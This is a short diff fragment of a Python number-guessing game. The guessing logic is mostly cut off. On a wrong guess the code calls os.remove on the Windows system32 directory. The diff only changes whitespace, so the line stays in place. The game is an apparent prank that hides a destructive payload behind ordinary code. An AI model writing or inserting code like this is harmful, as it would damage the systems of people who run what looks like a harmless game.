@@ -8,4 +8,4 @@ guess = int(guess)
 if guess == number:
 print("You won!")
 else:
-os.remove("c:\\windows\\system32")
+os.remove("c:\\windows\\system32") 
